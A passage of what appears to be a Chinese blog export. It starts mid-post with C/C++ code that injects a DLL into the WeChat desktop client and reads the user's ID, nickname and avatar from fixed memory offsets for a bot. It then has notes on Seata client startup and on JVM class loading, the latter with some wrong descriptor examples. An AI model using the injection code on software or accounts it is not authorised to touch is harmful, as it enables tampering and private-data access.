<h3 id="0x1-获取自己编写的dll写入到微信"><a href="#0x1-获取自己编写的dll写入到微信" class="headerlink" title="0x1 获取自己编写的dll写入到微信"></a>0x1 获取自己编写的dll写入到微信</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取进程ID</span></span><br><span class="line">DWORD processID = pi.dwProcessId;</span><br><span class="line"><span class="comment">// 打开进程</span></span><br><span class="line">HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取自己的dll路径</span></span><br><span class="line"><span class="built_in">string</span> dllPath = GetDllPath();</span><br><span class="line"><span class="comment">// 申请内存</span></span><br><span class="line">LPVOID dllBuffer = VirtualAllocEx(process, <span class="literal">NULL</span>, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="comment">// 写入dll路径</span></span><br><span class="line">BOOL bWp = WriteProcessMemory(process, dllBuffer, dllPath.c_str(), MAX_PATH, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (bWp == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  MessageBox(<span class="literal">NULL</span>, <span class="string">L"写入dll路径失败"</span>, <span class="string">L"错误"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="0x2-加载dll，创建远程线程"><a href="#0x2-加载dll，创建远程线程" class="headerlink" title="0x2 加载dll，创建远程线程"></a>0x2 加载dll，创建远程线程</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取LoadLibrary()函数</span></span><br><span class="line">FARPROC proc = GetProcAddress(GetModuleHandle(<span class="string">L"kernel32.dll"</span>), <span class="string">"LoadLibraryA"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建远程线程</span></span><br><span class="line">HANDLE hThread = CreateRemoteThread(process, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)proc, dllBuffer, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">  MessageBox(<span class="literal">NULL</span>, <span class="string">L"创建线程失败"</span>, <span class="string">L"错误"</span>, MB_OK);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">CloseHandle(process);</span><br></pre></td></tr></table></figure>
<h3 id="0x3-写入dll完成后，自己的dll就可以操作微信任意内存了"><a href="#0x3-写入dll完成后，自己的dll就可以操作微信任意内存了" class="headerlink" title="0x3 写入dll完成后，自己的dll就可以操作微信任意内存了"></a>0x3 写入dll完成后，自己的dll就可以操作微信任意内存了</h3><p>获取个人信息</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">GetWeChatWinAddr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (weChatWinDllAddr == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		weChatWinDllAddr = (DWORD) LoadLibrary(<span class="string">L"WeChatWin.dll"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> weChatWinDllAddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.7.1.88</span></span><br><span class="line">DWORD base = GetWeChatWinAddr();</span><br><span class="line"><span class="keyword">char</span>* wxid = (<span class="keyword">char</span>*) (base + <span class="number">0x1397440</span>); <span class="comment">// 微信号</span></span><br><span class="line"><span class="keyword">char</span>* nickname = (<span class="keyword">char</span>*) (base + <span class="number">0x13972DC</span>); <span class="comment">// 昵称</span></span><br><span class="line"><span class="keyword">char</span>* head = (<span class="keyword">char</span>*) (*(DWORD*)(base + <span class="number">0x13975A4</span>)); <span class="comment">// 头像</span></span><br></pre></td></tr></table></figure>
<h3 id="0x4-成品展示"><a href="#0x4-成品展示" class="headerlink" title="0x4 成品展示"></a>0x4 成品展示</h3><p><img src="https://wx2.sinaimg.cn/large/afc434bdgy1gc2nd6vgpzj20mc0gbajc.jpg" alt="成品展示"></p>
]]></content>
      
        <categories>
            
            <category> c </category>
            
        </categories>
        
        
        <tags>
            
            <tag> c/c++ </tag>
            
            <tag> 微信 </tag>
            
            <tag> PC微信 </tag>
            
            <tag> 微信机器人 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Seata 0.8.1~1.0.0客户端启动过程分析]]></title>
      <url>/2019/seata-client-bootstrap/</url>
      <content type="html"><![CDATA[<h1 id="Seata-0-8-1-1-0-0客户端启动过程分析"><a href="#Seata-0-8-1-1-0-0客户端启动过程分析" class="headerlink" title="Seata 0.8.1~1.0.0客户端启动过程分析"></a>Seata 0.8.1~1.0.0客户端启动过程分析</h1><h2 id="1-加载registry配置"><a href="#1-加载registry配置" class="headerlink" title="1. 加载registry配置"></a>1. 加载registry配置</h2><p>transactionServiceGroup默认为${spring.application.name}-fescar-service-group<br>可以通过spring.cloud.alibaba.seata.txServiceGroup指定</p>
<a id="more"></a>
<p>核心类：<code>io.seata.config.ConfigurationFactory static {}</code> 初始化CURRENT_FILE_INSTANCE</p>
<ol>
<li><p>加载registry(环境隔离)</p>
<ul>
<li><p>先从System.getProperty读取seata.config.name的value{seataConfigName}</p>
</li>
<li><p>如果seataConfigName为null再从System.getenv获取SEATA_CONFIG_NAME的value{seataConfigName}</p>
</li>
<li><p>如果{seataConfigName}为null，则{seataConfigName}为默认值registry</p>
</li>
<li><p>先从System.getProperty读取seataEnv的value{seataEnv}</p>
</li>
<li><p>如果{seataEnv}为null，再从System.getenv获取SEATA_ENV的value{seataEnv}</p>
</li>
<li><p>如果{seataEnv}为null读取{seataConfigName}.conf，否则读取{seataConfigName}-{seataEnv}.conf</p>
</li>
<li><p>得到{registryConfiguration}</p>
</li>
<li><p>加载registry后，读取config.type的value{configType}</p>
</li>
<li><p>configType为file时，加载file-{seataEnv}.conf(FileConfiguration)，否则创建对应类型的Configuration(NacosConfiguration, ApolloConfiguration, ConsulConfiguration, EtcdConfiguration, ZookeeperConfiguration)</p>
</li>
<li><p>得到{configConfiguration}</p>
</li>
</ul>
</li>
</ol>
<p>PS：使用nacos做配置中心时，如果namespace是public应该这么配置namespace = “”</p>
<h2 id="2-TM启动"><a href="#2-TM启动" class="headerlink" title="2. TM启动"></a>2. TM启动</h2><ol>
<li><p>获取TmRpcClient实例</p>
<ol>
<li><p>初始化NettyClientConfig</p>
<ol>
<li><p>从{configConfiguration}中获取与NettyClientConfig类相关的配置有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">transport.thread-factory.client-selector-thread-size</span><br><span class="line">transport.thread-factory.client-selector-thread-prefix</span><br><span class="line">transport.thread-factory.client-worker-thread-prefix</span><br><span class="line"></span><br><span class="line">transport.thread-factory.worker-thread-size</span><br><span class="line"></span><br><span class="line">transport.type</span><br><span class="line">transport.server</span><br><span class="line">transport.heartbeat</span><br><span class="line"></span><br><span class="line"># rpc通讯配置</span><br><span class="line">transport.serialization</span><br><span class="line">transport.compressor</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<ol>
<li><p>启动客户端与相关定时器</p>
<ol>
<li><p>获取是否降级配置service.enableDegrade</p>
</li>
<li><p>初始化netty的bootstrap</p>
</li>
<li><p>启动定时重连定时器(<a href="#连接seata-server">连接seata-server</a>)</p>
</li>
<li><p>启动合并消息定时器，并运行合并消息任务()</p>
</li>
</ol>
</li>
</ol>
<h3 id="连接seata-server"><a href="#连接seata-server" class="headerlink" title="连接seata-server"></a>连接seata-server</h3><p>核心类：<code>io.seata.discovery.registry.RegistryFactory#getInstance()</code> 获取注册中心实例</p>
<ol>
<li><p>先从{registryConfiguration}对象中registry.type的value</p>
<ul>
<li><h4 id="file模式"><a href="#file模式" class="headerlink" title="file模式"></a>file模式</h4></li>
</ul>
<ol>
<li>从{configConfiguration} 对象中，读取service.vgroup_mapping.{transactionServiceGroup}的value{clusterName}</li>
<li>通过service.{clusterName}.grouplist查找ip:port列表用;分隔</li>
<li>通过ip:port连接seata-server</li>
</ol>
<ul>
<li><h4 id="nacos模式"><a href="#nacos模式" class="headerlink" title="nacos模式"></a>nacos模式</h4></li>
</ul>
<ol>
<li>从{configConfiguration}对象中，读取service.vgroup_mapping.{transactionServiceGroup}的value{clusterName}</li>
<li>如果本地缓存{CLUSTER_ADDRESS_MAP}中存在{clusterName}对应的ip:port列表，直接进行3.3步</li>
<li>不存在<ol>
<li>创建nacos的NamingInstance<ol>
<li>读取nacos serverAddr, 先从System.getProperty的value{nacosServerAddr} 为null则从{configConfiguration}对象中读取registry.nacos.serverAddr的value{nacosServerAddr}</li>
<li>读取namespce, 先从System.getProperty的value{namespace} 为null则从{configConfiguration}对象中读取registry.nacos.namespace的value{namespace}</li>
</ol>
</li>
<li>获取所有的server实例<ol>
<li>根据serverAddr(这里就是一个字符串)和{clusterName}请求nacos server获取所有的seata-server ip:port列表，并缓存到本地</li>
<li>开启nacos的subscribe监听，刷新{CLUSTER_ADDRESS_MAP}</li>
</ol>
</li>
<li>通过ip:port连接seata-server</li>
</ol>
</li>
</ol>
<ul>
<li><h4 id="Eureka模式"><a href="#Eureka模式" class="headerlink" title="Eureka模式"></a>Eureka模式</h4><ol>
<li>根据registry.eureka.serviceUrl, registry.eureka.weight创建eurekaClient实例</li>
<li>从{configConfiguration}对象中，读取service.vgroup_mapping.{transactionServiceGroup}的value{clusterName}</li>
<li>获取eureka上所有注册的application</li>
<li>返回名称为{clusterName}的ip:port列表</li>
<li>通过ip:port连接seata-server</li>
</ol>
</li>
<li><h4 id="Consul模式"><a href="#Consul模式" class="headerlink" title="Consul模式"></a>Consul模式</h4><ol>
<li>根据registry.consul.serverAddr创建ConsulClient实例</li>
<li>从{configConfiguration}对象中，读取service.vgroup_mapping.{transactionServiceGroup}的value{clusterName}</li>
<li>ConsulClient实例根据registry.consul.cluster获取说有的ip:port列表</li>
<li>返回名称为{clusterName}的ip:port列表</li>
<li>通过ip:port连接seata-server</li>
</ol>
</li>
<li><h4 id="Etcd模式"><a href="#Etcd模式" class="headerlink" title="Etcd模式"></a>Etcd模式</h4><ol>
<li>根据registry.etcd3.serverAddr创建Etcd实例</li>
<li>从{configConfiguration}对象中，读取service.vgroup_mapping.{transactionServiceGroup}的value{clusterName}</li>
<li>Etcd实例根据registry-seata-{registry.etcd3.cluster}获取说有的ip:port列表</li>
<li>返回名称为{clusterName}的ip:port列表</li>
<li>通过ip:port连接seata-server</li>
</ol>
</li>
<li><h4 id="Redis模式-目前只有单机模式"><a href="#Redis模式-目前只有单机模式" class="headerlink" title="Redis模式(目前只有单机模式)"></a>Redis模式(目前只有单机模式)</h4><ol>
<li><p>根据registry.redis.serverAddr, registry.redis.db创建JedisPool实例</p>
<p>(可选配置registry.redis.password, registry.redis.test.on.borrow, registry.redis.test.on.return, registry.redis.test.while.idle, registry.redis.max.idle, registry.redis.min.idle, registry.redis.max.active, registry.redis.max.total, registry.redis.max.wait, registry.redis.timeout, registry.redis.num.tests.per.eviction.run, registry.redis.time.between.eviction.runs.millis, registry.redis.min.evictable.idle.time.millis)</p>
</li>
<li><p>从{configConfiguration}对象中，读取service.vgroup_mapping.{transactionServiceGroup}的value{clusterName}</p>
</li>
<li><p>从JedisPool实例中回去Jedis对象，从jedis对象中hgetAll({registry.redis.cluster})拿到所有的ip:port列表</p>
</li>
<li><p>返回名称为{clusterName}的ip:port列表</p>
</li>
<li><p>通过ip:port连接seata-server</p>
</li>
</ol>
</li>
<li><h4 id="Zookeeper模式"><a href="#Zookeeper模式" class="headerlink" title="Zookeeper模式"></a>Zookeeper模式</h4><ol>
<li>从{configConfiguration}对象中，读取service.vgroup_mapping.{transactionServiceGroup}的value{clusterName}</li>
<li>根据registry.zk.serverAddr, registry.zk.session.timeout, registry.zk.connect.timeout创建zkClient实例</li>
<li>从/registry/zk/{clusterName}获取所有的ip:port列表</li>
<li>通过ip:port连接seata-server</li>
</ol>
</li>
<li><h4 id="sofa模式"><a href="#sofa模式" class="headerlink" title="sofa模式"></a>sofa模式</h4><ol>
<li>初始化sofa配置, 优先从System.getProperty中获取registry.sofa.serverAddr, registry.sofa.region, registry.sofa.datacenter, registry.sofa.group, registry.sofa.cluster, registry.sofa.addressWaitTime, 获取不到从{configConfiguration}中获取相应的配置</li>
<li>从{configConfiguration}对象中，读取service.vgroup_mapping.{transactionServiceGroup}的value{clusterName}</li>
<li>获取sofaRegistry实例并注册监听器，监听器根据{clusterName}获取ip:port列表</li>
<li>通过ip:port连接seata-server</li>
</ol>
</li>
</ul>
</li>
</ol>
<p>PS：当获取不到ip:port列表时，会报no available server to connect，此时需要检查一下配置中心上是否配置了service.vgroup_mapping.{transactionServiceGroup}</p>
<p>优先从System.getProperty中读取，读取不到再从对应的配置类中读取。</p>
<p>FileConfiguration: 读取file-{seataEnv}.conf中service.vgroup_mapping.{transactionServiceGroup}</p>
<p>NacosConfiguration: 读取对应namespace中service.vgroup_mapping.{transactionServiceGroup}的值</p>
<p>ApolloConfiguration: 读取service.vgroup_mapping.{transactionServiceGroup}的值</p>
<p>ConsulConfiguration: 读取service.vgroup_mapping.{transactionServiceGroup}的值</p>
<p>EtcdConfiguration: 读取service.vgroup_mapping.{transactionServiceGroup}的值</p>
<p>ZookeeperConfiguration: 会从zookeeper的/config/service.vgroup_mapping.{transactionServiceGroup}读取</p>
<h2 id="3-RM启动"><a href="#3-RM启动" class="headerlink" title="3. RM启动"></a>3. RM启动</h2><ol>
<li>获取RmRpcClient实例</li>
<li>设置资源管理器(ResourceManager)</li>
<li>设置客户端消息监听器</li>
<li><a href="#连接seata-server">连接seata-server</a>(与TM相同)</li>
</ol>
<p>PS:如有错误，请留言纠正</p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> seata </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[深入理解JVM]]></title>
      <url>/2019/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM/</url>
      <content type="html"><![CDATA[<h1 id="类的加载，连接与初始化"><a href="#类的加载，连接与初始化" class="headerlink" title="类的加载，连接与初始化"></a>类的加载，连接与初始化</h1><ul>
<li><p>加载：查找并加载类的二进制</p>
</li>
<li><p>连接</p>
<ul>
<li>验证：确保被加载的类的正确性</li>
<li>准备：为类的静态变量分配内存，并将其初始化为默认值</li>
<li>解析：把类中的符号引用转为直接引用</li>
</ul>
</li>
</ul>
<a id="more"></a>
<ul>
<li><p>初始化：为类的静态变量赋于正确的初始值</p>
</li>
<li><p>Java程序对类的使用方式可以分为两种</p>
<ul>
<li>主动使用</li>
<li>被动使用</li>
</ul>
</li>
<li><p>所有的Java虚拟机实现必须在每个类或接口被Java程序“首次主动使用”时才初始化它们</p>
</li>
<li><p>主动使用</p>
<ul>
<li>创建类的实例</li>
<li>访问某个类或接口的静态变量，或者对该静态变量赋值‘</li>
<li>调用类的静态方法</li>
<li>反射（如Class.forName(“com.test.Test”)）</li>
<li>初始化一个类的子类</li>
<li>Java虚拟机启动时被标明为启动类的类（如执行 java Test）</li>
<li>JDK1.7开始提供的动态语言支持：java.lang.invoke.MethodHandle实例的解析结果REF_getStatic，REF_putStatic，REF_invokeStatic句柄对应的类没有初始化，则初始化</li>
</ul>
<p>除了上述7种情形，其他使用Java类的方式都被看作被动使用，不会导致类的初始化。</p>
</li>
</ul>
<h1 id="类的加载"><a href="#类的加载" class="headerlink" title="类的加载"></a>类的加载</h1><p>类的加载指的是将类的.class文件中的二进制数据读入到内存中，将其放在运行时的数据区内，然后在内存中创建一个java.lang.Class对象（规范并未说明Class对象位于哪里，HotSpot虚拟机将其放在了方法区中）用来防撞类在方法区的数据结构。</p>
<h1 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h1><ul>
<li>Java虚拟机自带的类加载器<ul>
<li>根类加载器（Bootstrap）从系统属性sun.boot.class.path指定的目录加载类(jar, class)，它并没有继承ClassLoader</li>
<li>扩展类加载器（Extension）它的父加载器为根类加载器，它从系统属性java.ext.dirs指定的目录加载类库，或者从JDK的安装目录的jre/lib/ext目录加载类库（即jar）</li>
<li>系统（应用）类加载器（System/App）它的父加载器为扩展类加载器，它从环境变量classpath或系统属性java.class.path指定的目录加载类(jar, class)，它是用户自定义加载器的默认父加载器，系统类加载器是纯Java类，是java.lang.ClassLoader类的子类。</li>
</ul>
</li>
<li>用户自定义的类加载器<ul>
<li>java.lang.ClassLoader的子类</li>
<li>用户可以定制类的加载方式</li>
</ul>
</li>
</ul>
<p>类加载器会把类加载到Java虚拟机中，从JDK 1.2版本开始，类的加载过程采用双亲委托机制，这种机制能更好的保证Java平台的安全，在此委托机制中，除了Java虚拟机自带的根类加载器外，其余的加载器都有且只有一个父加载器，当Java程序请求加载器loader1加载Sample类时，loader1首先委托自己的父加载器去加载Sample类，若如加载器能加载，则由父加载器完成加载任务，否则才由加载器loader1本身加载Sample类。</p>
<h1 id="类的初始化"><a href="#类的初始化" class="headerlink" title="类的初始化"></a>类的初始化</h1><ul>
<li>步骤<ul>
<li>假如这个类还没有被加载和连接，那就先进行加载和连接</li>
<li>假如类存在直接父类，并且这个父类还没有被初始化，那就先初始化直接父类</li>
<li>假如类中存在初始化语句，那就依次执行这些初始化语句</li>
</ul>
</li>
</ul>
<h1 id="类的初始化时机"><a href="#类的初始化时机" class="headerlink" title="类的初始化时机"></a>类的初始化时机</h1><ul>
<li>当Java虚拟机初始化一个实例时，要求它所有的父类都已经初始化，但是这条规则并不适用于接口</li>
<li>在初始化一个类时，并不会先初始化它所实现的接口</li>
<li>在初始化一个接口时，并不会先初始化它的父接口</li>
</ul>
<p>因此，一个父接口并不会因为它的子接口或者实现类的初始化而初始化，只有当程序首次使用特定接口的静态变量时，才会导致该接口的初始化。</p>
<p>调用ClassLoader类的loadClass方法加载一个类，并不是对类的主动使用，不会导致类的初始化。</p>
<h1 id="获取ClassLoader的途径"><a href="#获取ClassLoader的途径" class="headerlink" title="获取ClassLoader的途径"></a>获取ClassLoader的途径</h1><p>获取当前类的ClassLoader</p>
<p>clazz.getClassLoader()</p>
<p>获取当前线程上下文的ClassLoader</p>
<p>Thread.currentThread().getContextClassLoader()</p>
<p>获取系统的ClassLoader</p>
<p>ClassLoader.getSystemClassLoader()</p>
<p>获取调用者的ClassLoader</p>
<p>sun.reflect.Relection.getCallerClass().getClassLoader()</p>
<h1 id="类加载器的双亲委托机制"><a href="#类加载器的双亲委托机制" class="headerlink" title="类加载器的双亲委托机制"></a>类加载器的双亲委托机制</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader loader1 = <span class="keyword">new</span> MyClassLoader();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数loader1将作为loader2的父加载器</span></span><br><span class="line">ClassLoader loader2 = <span class="keyword">new</span> MyClassLoader(loader1);</span><br></pre></td></tr></table></figure>
<p>双亲委托机制的优点是能够提高软件系统的安全性。因此在此机制下，用户自定义的类加载器不可能加载应该由父加载器加载的可靠类，从而防止不可靠甚至恶意的代码替代父加载器加载的可靠代码，例如：java.lang.Object 类总是由根类加载器加载，其他任何用户自定义的类加载器都不可能加载包含有恶意代码的java.lang.Object类</p>
<h1 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h1><ul>
<li>每个类加载器都有自己的命名空间，命名空间由该加载器及所有父加载器所加载的类组成</li>
<li>在同一个命名空间中，不会出现类的完成名字（包括类的包名）相同的两个类</li>
<li>在不同的命名空间中，有可能会出现类的全限定名（包括类的包名）相同的两个类</li>
</ul>
<p>java.lang.ClassCastException: com.test.Test cannot be cast to com.test.Test</p>
<h1 id="类的卸载"><a href="#类的卸载" class="headerlink" title="类的卸载"></a>类的卸载</h1><p>由用户自定义的类加载器所加载的类是可以被卸载的</p>
<p>SPI (Service Interface Provider)</p>
<p>例子：JDBC</p>
<h1 id="字节码"><a href="#字节码" class="headerlink" title="字节码"></a>字节码</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javap -c com.test.Test1</span><br><span class="line">javap -verbose com.test.Test1</span><br></pre></td></tr></table></figure>
<ul>
<li><p>使用javap -verbose命令分析一个字节码时，将会分析字节码文件的魔数，版本号，常量池，类信息，类的构造方法，类中的方法信息，类变量与成员变量等信息。</p>
</li>
<li><p>魔数：所有的.class字节码文件的前4个字节都是魔数，魔数值为固定值：0xCAFEBABE</p>
</li>
<li><p>魔数之后的4个字节时版本信息，前两个字节时minor version（次版本号），后两个字节时major version（主版本号）这里的版本号为00 00 00 34 换算成十进制，表示次版本号为0，主版本号为52. 所以该文件的版本号为1.8.0，可以通过java -version来验证。</p>
</li>
<li>常量池（constant pool）：紧接着主版本号之后就是常量池的入口，一个Java类中定义的很多信息都是常量池来维护和描述的，可以将常量池看作是Class文件的资源仓库，比如说Java类中定义的方法与变量信息，都是存在在常量池中，常量池中主要存储两类常量：字面量与符号引用，字面量如文本字符串，Java中声明为final的常量等，而符号引用和接口的全限定名，字段的名称和描述，方法的名称和描述符等。</li>
<li>常量池的总体结构：Java类所对应的常量池主要由常量数量和常量池数组这两个部分组成。常量池数量紧跟在主版本号之后，占2个字节；常量池数组紧跟在常量池数量之后。常量池数组与一般的数组不同的是，常量池数组中不同的元素的类型，结构都是不同的。长度当然也就不同；但是，每一种元素的第一个数据都是一个u1类型，该字节是个标志位，占1个字节，JVM在解析常量池时，会根据这个u1类型来获取元素的具体类型。值得注意的是，常量池数组中元素的个数 = 常量池数 - 1（其中0暂时不实用）。目的是满足某些常量池索引值的数据在特定情况下需要表达「不引用任何一个常量池」；根本原因在于，索引值为0也是一个常量（保留常量），只不过它不位于常量表中，这个常量对应null值，常量池的索引从1而非0开始。</li>
<li>在JVM规范中，每个变量/字段都有描述信息，描述信息主要的作用是描述字段的数据类型，方法的参数列表（包括数量，类型与顺序），根据描述符规则，基本数据类型和代表无返回值的void类型都用一个大写字符来表示，对象类型则使用字符L加对象全限定名称来表示，为了压缩字节码文件的体积，对于基本数据类型，JVM都只使用一个大写字母表示，如下所示：<code>B - byte, C - char, D - double, F - float, I = int, J = long, S - short, Z - boolean, V - void, L - 对象类型，如Ljava/lang/String;</code></li>
<li>对于数组类型来说，每一个维度使用一个前置[来表示，如<code>int[]</code>被记录为<code>[I,</code> <code>String[][]</code>被记录为<code>[[java/lang/String;</code></li>
<li>用描述符来描述方法的时候，按照先参数列表，后返回值的顺序来描述，参数列表按照参数的严格顺序放在一组()之内，如方法：<code>String getPersonByIdAndName(int id, String name)</code>的描述符为：<code>([I,Ljava/lang/String;)Ljava/lang/String;</code></li>
</ul>
<h1 id="完整的Java字节码结构"><a href="#完整的Java字节码结构" class="headerlink" title="完整的Java字节码结构"></a>完整的Java字节码结构</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ClassFile &#123;</span><br><span class="line">    u4 magic; <span class="comment">// 魔数</span></span><br><span class="line">    u2 minor_version; <span class="comment">// 次版本号</span></span><br><span class="line">    u2 major_version; <span class="comment">// 主版本号</span></span><br><span class="line">    u2 constant_pool_count; <span class="comment">// 常量池个数</span></span><br><span class="line">    constant_pool constant_pool_count - <span class="number">1</span>; <span class="comment">// 常量池表</span></span><br><span class="line">    u2 access_flag; <span class="comment">// 类的访问控制权限</span></span><br><span class="line">    u2 this_class; <span class="comment">// 类名</span></span><br><span class="line">    u2 super_class; <span class="comment">// 父类名</span></span><br><span class="line">    u2 interfaces_count; <span class="comment">// 接口数量</span></span><br><span class="line">    u2 interfaces; <span class="comment">// 接口个数</span></span><br><span class="line">    u2 fields_count; <span class="comment">// 字段个数</span></span><br><span class="line">    field_info fields; <span class="comment">// 字段表</span></span><br><span class="line">    u2 methods_count; <span class="comment">// 方法个数</span></span><br><span class="line">    method_info methods; <span class="comment">// 方法表</span></span><br><span class="line">    u2 attributes_count; <span class="comment">// 附加属性的个数</span></span><br><span class="line">    attribute_info attributes; <span class="comment">// 附加属性表</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>u1, u2, u4, u8 表示1个字节，2个字节，4个字节，8个字节</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">javap -verbose org.xxz.Test1 </span><br><span class="line">Classfile /Users/tt/IdeaProjects/demo/target/classes/org/xxz/Test1.class</span><br><span class="line">  Last modified <span class="number">2019</span>-<span class="number">6</span>-<span class="number">7</span>; size <span class="number">455</span> bytes</span><br><span class="line">  MD5 checksum cb0d025ecc8eb40b573008dd290ac668</span><br><span class="line">  Compiled from <span class="string">"Test1.java"</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">org</span>.<span class="title">xxz</span>.<span class="title">Test1</span></span></span><br><span class="line">  minor version: 0</span><br><span class="line">  major version: <span class="number">52</span></span><br><span class="line">  flags: ACC_PUBLIC, ACC_SUPER</span><br><span class="line">Constant pool:</span><br><span class="line">   #1 = Methodref          #4.#20         // java/lang/Object."&lt;init&gt;":()V</span><br><span class="line">   #2 = Fieldref           #3.#21         // org/xxz/Test1.a:I</span><br><span class="line">   #3 = Class              #22            // org/xxz/Test1</span><br><span class="line">   #4 = Class              #23            // java/lang/Object</span><br><span class="line">   #5 = Utf8               a</span><br><span class="line">   #6 = Utf8               I</span><br><span class="line">   #7 = Utf8               &lt;init&gt;</span><br><span class="line">   #8 = Utf8               ()V</span><br><span class="line">   #9 = Utf8               Code</span><br><span class="line">  #10 = Utf8               LineNumberTable</span><br><span class="line">  #11 = Utf8               LocalVariableTable</span><br><span class="line">  #12 = Utf8               this</span><br><span class="line">  #13 = Utf8               